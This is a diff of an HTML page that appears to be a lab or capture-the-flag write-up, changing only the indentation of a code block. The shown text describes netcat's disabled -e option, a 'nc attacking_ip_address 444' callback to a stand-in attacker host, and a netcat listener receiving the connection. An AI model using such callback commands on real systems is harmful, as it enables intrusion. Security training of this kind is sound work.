@@ -80,11 +80,10 @@
                 <p>Maybe it just does not like the attempt to execute the shell; in many systems, especially on newer versions of netcat (like netcat-openbsd), the -e option (which allows execution of commands) is disabled by default due to security concerns, as it can be used for malicious purposes (like reverse shells!!). So let us see if we can simply submit the command...</p>
                 <pre><code>nc attacking_ip_address 444</code></pre>
                 <p>It worked!!</p>
-                <pre><code>
-                    case@local:~$ sudo nc -lvnp 444
-                    [sudo] password for case:
-                    Listening on 0.0.0.0 444
-                    Connection received on 10.10.43.192 37146
+                <pre><code>case@local:~$ sudo nc -lvnp 444
+[sudo] password for case:
+Listening on 0.0.0.0 444
+Connection received on 10.10.43.192 37146
                 </code></pre>
             </section>
             
